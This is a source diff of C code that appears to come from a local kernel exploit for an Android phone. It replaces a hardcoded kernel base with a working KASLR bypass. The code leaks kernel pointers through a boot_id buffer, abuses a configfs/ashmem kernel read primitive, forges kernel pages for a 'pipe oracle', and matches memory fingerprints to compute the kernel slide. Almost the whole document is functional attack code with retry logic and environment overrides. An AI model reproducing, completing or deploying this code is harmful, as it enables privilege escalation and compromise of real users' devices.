@@ -1,5 +1,4 @@
 #include "common.h"
-#include P0_FINGERPRINT_HEADER
 
 #ifndef SLIDE_MAX_ATTEMPTS
 #define SLIDE_MAX_ATTEMPTS 20
@@ -64,7 +63,7 @@ static int slide_commit_virtual_base(uint64_t base, const char *source) {
     pr_warning("virtual base rejected source=%s base=%016llx\n",
                source, (unsigned long long)base);
     return 0;
-  }  
+  }
   kaslr_base = base;
   kaslr_slide = base - KIMAGE_TEXT_BASE;
   kaslr_done = 1;
@@ -74,49 +73,6 @@ static int slide_commit_virtual_base(uint64_t base, const char *source) {
              source, getpid(), (unsigned long long)kaslr_base,
              (unsigned long long)kaslr_slide, slide_p0_offset);
   return 1;
-}
-#endif
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-
-static int verify_slide_virtual(int ashmem_fd) {
-  size_t num_candidates = sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
-  pr_info("virtual slide verification: %zu candidates, probe=0x801f0000\n",
-          num_candidates);
-
-  /* Fixed direct map VA for physical probe location */
-  uintptr_t probe_base = 0xffffff8080000000ULL + 0x1f0000ULL;
-
-  for (size_t idx = 0; idx < num_candidates; idx++) {
-    uintptr_t slide = p0_fingerprints[idx].slide;
-
-    int match = 1;
-    for (int w = 0; w < P0_FINGERPRINT_WORDS; w++) {
-      uintptr_t addr = probe_base + p0_fingerprint_offsets[w];
-      uint64_t value = 0;
-      ssize_t ret = configfs_read_once(ashmem_fd, addr, &value, sizeof(value));
-      pr_info("virtual verify: idx=%zu slide=%06zx word=%d addr=%016zx "
-              "ret=%zd val=%016llx expected=%016llx\n",
-              idx, slide, w, addr, ret,
-              (unsigned long long)value,
-              (unsigned long long)p0_fingerprints[idx].words[w]);
-      if (ret != (ssize_t)sizeof(value)) {
-        match = 0;
-        break;
-      }
-      if (value != p0_fingerprints[idx].words[w]) {
-        match = 0;
-        break;
-      }
-    }
-
-    if (match) {
-      pr_success("virtual slide verification matched slide=%06zx\n", slide);
-      return slide_commit_stext(KIMAGE_TEXT_BASE + slide, "virtual");
-    }
-  }
-
-  pr_error("virtual slide verification: no fingerprint matched\n");
-  return 0;
 }
 #endif
 
@@ -671,14 +627,13 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     *errno_ptr = 0;
     long ret = sched_setattr_tid(tid, (calls % 19) + 1);
     int saved_errno = *errno_ptr;
-/* #if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
+#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
     pr_info("slide pselect blocked ready=%d ready_usec=%zu ready_wchan=%s "
             "guard=%d guard_usec=%zu guard_wchan=%s age_usec=%llu tid=%d\n",
             ready_ok, ready_elapsed_usec, ready_wchan,
             guard_ok, guard_elapsed_usec, guard_wchan,
             (unsigned long long)pselect_age_usec, tid);
-#endif */
-
+#endif
     atomic_store(&slide_consume_last_sched_ret, (int)ret);
     atomic_store(&slide_consume_last_sched_errno, saved_errno);
     if (ret == 0) {
@@ -803,8 +758,13 @@ uint64_t slide_read_stext(void) {
   int out = 0;
   for (ssize_t i = 0; i < n && out < 16; i++) {
     int v = hex_value(buf[i]);
-    if (v < 0) continue;
-    if (nibble < 0) { nibble = v; continue; }
+    if (v < 0) {
+      continue;
+    }
+    if (nibble < 0) {
+      nibble = v;
+      continue;
+    }
     raw[out++] = (unsigned char)((nibble << 4) | v);
     nibble = -1;
   }
@@ -813,33 +773,23 @@ uint64_t slide_read_stext(void) {
     return 0;
   }
 
-  /* Check window 0 (bytes 0-7) */
-  uint64_t leaked0 = 0;
-  for (int i = 0; i < 8; i++) leaked0 |= (uint64_t)raw[i] << (i * 8);
-  pr_info("slide boot_id window0=%016llx\n", (unsigned long long)leaked0);
-  if ((leaked0 >> 48) == 0xffff) {
-    uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
-    uint64_t stext = leaked0 - off;
-    pr_success("slide boot_id_leaked_nfulnl_logger window=0 value=%016llx stext=%016llx\n",
-               (unsigned long long)leaked0, (unsigned long long)stext);
-    return stext;
+  uint64_t leaked = 0;
+  for (int i = 0; i < 8; i++) {
+    leaked |= (uint64_t)raw[i] << (i * 8);
+  }
+  if ((leaked >> 48) != 0xffff) {
+    pr_warning("slide bad leaked pointer=%016llx\n",
+               (unsigned long long)leaked);
+    return 0;
   }
 
-  /* Check window 1 (bytes 8-15) */
-  uint64_t leaked1 = 0;
-  for (int i = 0; i < 8; i++) leaked1 |= (uint64_t)raw[i + 8] << (i * 8);
-  pr_info("slide boot_id window1=%016llx\n", (unsigned long long)leaked1);
-  if ((leaked1 >> 48) == 0xffff) {
-    uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
-    uint64_t stext = leaked1 - off;
-    pr_success("slide boot_id_leaked_nfulnl_logger window=1 value=%016llx stext=%016llx\n",
-               (unsigned long long)leaked1, (unsigned long long)stext);
-    return stext;
-  }
-
-  pr_warning("slide bad leaked pointer window0=%016llx window1=%016llx\n",
-             (unsigned long long)leaked0, (unsigned long long)leaked1);
-  return 0;
+  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
+  uint64_t stext = leaked - off;
+  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
+             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
+  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
+             getpid(), (unsigned long long)stext);
+  return stext;
 }
 uint64_t slide_child_leak_stext(void) {
   pthread_t waiter;
@@ -1109,85 +1059,163 @@ int app_trigger_fops_slide_route(void) {
 #endif
 
 static int slide_leak_physical_base(void) {
-  /* S25FE: bypass P0 physical entirely */
-  pr_info("S25FE: bypassing P0 physical, using virtual verification\n");
-  int ashmem_fd = open_ashmem_device();
-  if (ashmem_fd < 0) {
-    pr_error("virtual verify: cannot open ashmem errno=%d\n", errno);
+  size_t started = gettime_ns();
+  if (!prepare_p0_pipe_oracle()) {
+    pr_error("p0 physical pipe preparation failed\n");
     return 0;
   }
-
-  /* --- DIAG: test configfs primitive on known addresses --- */
-  {
-    uint64_t val = 0;
-    ssize_t ret;
-    unsigned long test_addr;
-    const char *name;
-
-    /* Test 1: direct map base */
-    test_addr = 0xffffff8080000000ULL;
-    name = "direct-map-base";
-    ret = configfs_read_once(ashmem_fd, test_addr, &val, sizeof(val));
-    pr_info("DIAG: name=%s addr=%016lx ret=%zd val=%016llx errno=%d\n",
-            name, test_addr, ret, (unsigned long long)val, errno);
-
-    /* Test 2: probe start area */
-    test_addr = 0xffffff80801f0000ULL;
-    name = "probe-start";
-    ret = configfs_read_once(ashmem_fd, test_addr, &val, sizeof(val));
-    pr_info("DIAG: name=%s addr=%016lx ret=%zd val=%016llx errno=%d\n",
-            name, test_addr, ret, (unsigned long long)val, errno);
-
-    /* Test 3: known .data symbol (slide_logger) */
-    test_addr = 0xffffff80016dce21ULL;
-    name = "slide-logger";
-    ret = configfs_read_once(ashmem_fd, test_addr, &val, sizeof(val));
-    pr_info("DIAG: name=%s addr=%016lx ret=%zd val=%016llx errno=%d\n",
-            name, test_addr, ret, (unsigned long long)val, errno);
-
-    /* Test 4: another known .data symbol (bootid_data) */
-    test_addr = 0xffffff800243ef78ULL;
-    name = "bootid-data";
-    ret = configfs_read_once(ashmem_fd, test_addr, &val, sizeof(val));
-    pr_info("DIAG: name=%s addr=%016lx ret=%zd val=%016llx errno=%d\n",
-            name, test_addr, ret, (unsigned long long)val, errno);
-  }
-  /* --- END DIAG --- */
-    
-  for (size_t idx = 0;
-       idx < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
-       idx++) {
-    uintptr_t slide = p0_fingerprints[idx].slide;
-    uintptr_t probe_base = 0xffffff8080000000ULL + P0_ORACLE_PROBE_OFFSET + slide;
-
-    int match = 1;
-    for (int w = 0; w < P0_FINGERPRINT_WORDS; w++) {
-      uintptr_t addr = probe_base + p0_fingerprint_offsets[w];
-      uint64_t value = 0;
-      ssize_t ret = configfs_read_once(ashmem_fd, addr, &value, sizeof(value));
-      pr_info("virtual verify: slide=%06zx word=%d addr=%016zx ret=%zd val=%016llx expected=%016llx\n",
-              slide, w, addr, ret, (unsigned long long)value,
-              (unsigned long long)p0_fingerprints[idx].words[w]);
-      if (ret != (ssize_t)sizeof(value)) {
-        match = 0;
-        break;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#ifdef APP_SLIDE_FRESH_PAGE_ATTEMPTS
+  const int fresh_page_attempts = APP_SLIDE_FRESH_PAGE_ATTEMPTS;
+#else
+  const int fresh_page_attempts = 1;
+#endif
+  int fresh_attempt = 1;
+  int search_batch = 0;
+#ifdef APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES
+  const int max_search_batches = APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES;
+#else
+  const int max_search_batches = fresh_page_attempts;
+#endif
+  int refresh_oracle = 0;
+  while (fresh_attempt <= fresh_page_attempts &&
+         search_batch < max_search_batches) {
+#if defined(APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE) && \
+    APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE
+    if (refresh_oracle) {
+      reset_pipe_attempt();
+      if (!prepare_p0_pipe_oracle()) {
+        pr_error("p0 physical pipe refresh failed fresh=%d/%d\n",
+                 fresh_attempt, fresh_page_attempts);
+        return 0;
       }
-      if (value != p0_fingerprints[idx].words[w]) {
-        match = 0;
-        break;
+      pr_info("p0 pipe oracle refreshed fresh=%d/%d base=%016zx\n",
+              fresh_attempt, fresh_page_attempts, pipebuf_page_base);
+      refresh_oracle = 0;
+    }
+#endif
+    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+    search_batch++;
+    pr_info("p0 page search batch=%d/%d gate_attempt=%d/%d base=%016zx\n",
+            search_batch, max_search_batches, fresh_attempt,
+            fresh_page_attempts, page_base);
+    pr_info("p0 fresh page attempt=%d/%d base=%016zx\n",
+            fresh_attempt, fresh_page_attempts, page_base);
+    if (!page_base) {
+#ifndef APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES
+      fresh_attempt++;
+      refresh_oracle = 1;
+#endif
+      continue;
+    }
+    if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
+      pr_error("p0 physical pipe gate trigger failed fresh=%d/%d\n",
+               fresh_attempt, fresh_page_attempts);
+      fresh_attempt++;
+      refresh_oracle = 1;
+      continue;
+    }
+    int gate_result = verify_p0_pipe_oracle_gate();
+    pr_info("p0 fresh page result=%d attempt=%d/%d\n",
+            gate_result, fresh_attempt, fresh_page_attempts);
+    if (getenv("P0_ORACLE_GATE_DIAG")) {
+      pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
+      if (gate_result != 0) {
+        slide_restore_physical_oracle();
       }
+      return 0;
     }
-
-    if (match) {
-      pr_success("virtual slide verification matched slide=%06zx\n", slide);
-      close(ashmem_fd);
-      return slide_commit_stext(KIMAGE_TEXT_BASE + slide, "virtual");
+    if (gate_result == 0) {
+      pr_warning("p0 physical pipe reclaim miss fresh=%d/%d\n",
+                 fresh_attempt, fresh_page_attempts);
+      fresh_attempt++;
+      refresh_oracle = 1;
+      continue;
     }
+    app_publish_p0_dirty();
+    if (gate_result < 0) {
+      pr_error("p0 physical pipe gate changed unexpected pages\n");
+      slide_restore_physical_oracle();
+      return 0;
+    }
+    if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
+      slide_restore_physical_oracle();
+      return 0;
+    }
+    uintptr_t offset = scan_p0_pipe_oracle();
+    if (offset == (uintptr_t)-1) {
+      slide_restore_physical_oracle();
+      return 0;
+    }
+#if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
+    APP_P0_FINGERPRINT_INVERSE_SLIDE
+    if (offset > P0_ORACLE_PROBE_OFFSET) {
+      pr_error("p0 fingerprint source offset exceeds probe source=%08zx "
+               "probe=%08llx\n",
+               offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET);
+      slide_restore_physical_oracle();
+      return 0;
+    }
+    uintptr_t source_offset = offset;
+    offset = P0_ORACLE_PROBE_OFFSET - source_offset;
+    pr_info("p0 fingerprint inverse source_offset=%08zx probe=%08llx "
+            "runtime_slide=%08zx\n",
+            source_offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET,
+            offset);
+#endif
+    if (!slide_restore_physical_oracle()) {
+      return 0;
+    }
+    slide_p0_session_fresh = 1;
+    size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
+    pr_success("p0 physical elapsed_ms=%zu fresh=%d/%d\n",
+               elapsed_ms, fresh_attempt, fresh_page_attempts);
+    return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
   }
-
-  close(ashmem_fd);
-  pr_error("virtual slide verification: no fingerprint matched\n");
   return 0;
+#else
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+  if (!page_base) {
+    return 0;
+  }
+  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
+    pr_error("p0 physical pipe gate trigger failed\n");
+    return 0;
+  }
+  int gate_result = verify_p0_pipe_oracle_gate();
+  if (getenv("P0_ORACLE_GATE_DIAG")) {
+    pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
+    if (gate_result != 0) {
+      slide_restore_physical_oracle();
+    }
+    return 0;
+  }
+  if (gate_result == 0) {
+    pr_warning("p0 physical pipe reclaim miss\n");
+    return 0;
+  }
+  app_publish_p0_dirty();
+  if (gate_result < 0) {
+    pr_error("p0 physical pipe gate changed unexpected pages\n");
+    slide_restore_physical_oracle();
+    return 0;
+  }
+  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
+    slide_restore_physical_oracle();
+    return 0;
+  }
+  uintptr_t offset = scan_p0_pipe_oracle();
+  if (offset == (uintptr_t)-1) {
+    slide_restore_physical_oracle();
+    return 0;
+  }
+  if (!slide_restore_physical_oracle()) {
+    return 0;
+  }
+  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
+  pr_success("p0 physical elapsed_ms=%zu\n", elapsed_ms);
+  return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
+#endif
 }
 
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
@@ -1201,10 +1229,10 @@ static int slide_leak_virtual_base(uintptr_t physical_offset) {
   slide_p0_offset = physical_offset;
   p0_virtual_base_probe = 1;
 
-  /*if (!prepare_p0_pipe_oracle()) {
+  if (!prepare_p0_pipe_oracle()) {
     pr_error("p0 virtual pipe preparation failed\n");
     goto out;
-  }*/
+  }
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
   if (!page_base) {
     goto out;
@@ -1365,12 +1393,12 @@ static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
 
 int run_p0_pipe_oracle_diagnostic(int fd) {
   uintptr_t fops_page_base = page_base;
-  /*if (!prepare_p0_pipe_oracle() ||
+  if (!prepare_p0_pipe_oracle() ||
       !prepare_p0_diag_gate_payload(fd, fops_page_base)) {
     pr_error("p0 diagnostic preparation failed pipe=%016zx fops=%016zx\n",
              pipebuf_page_base, fops_page_base);
     return 0;
-  }*/ 
+  }
 
   uintptr_t target_start = slide_oracle_target - 0x20;
   uintptr_t parent_start = slide_oracle_parent;
@@ -1434,9 +1462,164 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
   return 1;
 }
 
-uint64_t slide_leak_kernel_base(void) {
-  uint64_t stext = 0xffffff8000000000ULL;
-  pr_success("slide-kaslr-ok source=hardcoded pid=%d base=%016llx slide=%016llx\n",
-             getpid(), (unsigned long long)stext, 0ULL);
-  return stext;
+int slide_leak_kernel_base(void) {
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
+  if (forced_offset_arg && *forced_offset_arg) {
+    char *end = NULL;
+    errno = 0;
+    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
+    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
+        (value & 0xffffULL) != 0) {
+      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
+      return 0;
+    }
+    const char *gate_page_arg = getenv("P0_GATE_PAGE_STRUCT");
+    const char *probe_page_arg = getenv("P0_PROBE_PAGE_STRUCT");
+    if (gate_page_arg && probe_page_arg) {
+      char *gate_end = NULL;
+      char *probe_end = NULL;
+      errno = 0;
+      p0_gate_page_struct = (uintptr_t)strtoull(
+          gate_page_arg, &gate_end, 0);
+      p0_probe_page_struct = (uintptr_t)strtoull(
+          probe_page_arg, &probe_end, 0);
+      if (errno || gate_end == gate_page_arg || *gate_end ||
+          probe_end == probe_page_arg || *probe_end) {
+        pr_error("slide invalid p0 restore pages gate=%s probe=%s\n",
+                 gate_page_arg, probe_page_arg);
+        return 0;
+      }
+    }
+    pr_info("slide forced p0 offset=%08llx\n", value);
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+    const char *virtual_base_arg = getenv("SLIDE_VIRTUAL_BASE");
+    if (virtual_base_arg && *virtual_base_arg) {
+      char *base_end = NULL;
+      errno = 0;
+      unsigned long long virtual_base =
+          strtoull(virtual_base_arg, &base_end, 0);
+      slide_p0_offset = (uintptr_t)value;
+      if (errno || base_end == virtual_base_arg || *base_end ||
+          !slide_commit_virtual_base(virtual_base, "forced-virtual")) {
+        pr_error("slide invalid forced virtual base=%s\n", virtual_base_arg);
+        return 0;
+      }
+      return 1;
+    }
+    return slide_leak_virtual_base((uintptr_t)value);
+#else
+    return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
+#endif
+  }
+  return slide_leak_physical_base();
+#else
+  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
+  uintptr_t forced_offset = 0;
+  int forced = forced_offset_arg && *forced_offset_arg;
+  if (forced) {
+    char *end = NULL;
+    errno = 0;
+    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
+    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
+        (value & 0xffffULL) != 0) {
+      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
+      return 0;
+    }
+    forced_offset = (uintptr_t)value;
+    pr_info("slide forced p0 offset=%08zx\n", forced_offset);
+    return slide_commit_stext(
+        KIMAGE_TEXT_BASE + forced_offset, "forced");
+  }
+
+  uint64_t existing_stext = slide_read_stext();
+  if (existing_stext && slide_commit_stext(existing_stext, "boot_id")) {
+    return 1;
+  }
+
+  int max_attempts = forced ? 1 : SLIDE_MAX_ATTEMPTS;
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(SLIDE_P0_OFFSET_CANDIDATES)
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+  if (!page_base) {
+    return 0;
+  }
+#endif
+  for (int attempt = 1; attempt <= max_attempts; attempt++) {
+    if (forced) {
+      slide_p0_offset = forced_offset;
+    } else {
+#ifdef SLIDE_P0_OFFSET_CANDIDATES
+      slide_p0_offset = slide_p0_offsets[
+          (size_t)(attempt - 1) %
+          (sizeof(slide_p0_offsets) / sizeof(slide_p0_offsets[0]))];
+#else
+      slide_p0_offset = 0;
+#endif
+    }
+    pr_info("slide attempt %d/%d p0_offset=%08zx logger_parent=%016llx "
+            "bootid_target=%016llx\n",
+            attempt, max_attempts, slide_p0_offset,
+            (unsigned long long)(SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset),
+            (unsigned long long)(
+                SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset));
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(SLIDE_P0_OFFSET_CANDIDATES)
+    if (!select_slide_payload_slot(slide_p0_offset)) {
+      pr_error("slide payload slot missing p0_offset=%08zx\n",
+               slide_p0_offset);
+      return 0;
+    }
+#else
+    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+    if (!page_base || !fake_lock) {
+      continue;
+    }
+#endif
+
+    int raw_fds[2];
+    SYSCHK(pipe(raw_fds));
+    int fds[2];
+    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
+    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
+    SYSCHK(close(raw_fds[0]));
+    SYSCHK(close(raw_fds[1]));
+
+    pid_t child = SYSCHK(fork());
+    if (child == 0) {
+      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+      if (getppid() == 1) {
+        _exit(1);
+      }
+      SYSCHK(close(fds[0]));
+      disable_rseq_for_thread();
+      slide_log_child_context();
+      uint64_t stext = slide_child_leak_stext();
+      if (stext) {
+        SYSCHK(write(fds[1], &stext, sizeof(stext)));
+        _exit(0);
+      }
+      _exit(1);
+    }
+
+    SYSCHK(close(fds[1]));
+    uint64_t stext = 0;
+    ssize_t n = read(fds[0], &stext, sizeof(stext));
+    SYSCHK(close(fds[0]));
+    int status = 0;
+    SYSCHK(waitpid(child, &status, 0));
+    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
+        WEXITSTATUS(status) != 0 || !stext) {
+      pr_warning("slide attempt %d failed n=%zd status=%d\n",
+                 attempt, n, status);
+      continue;
+    }
+
+    if (slide_commit_stext(stext, "pselect")) {
+      return 1;
+    }
+  }
+
+  return 0;
+#endif
 }
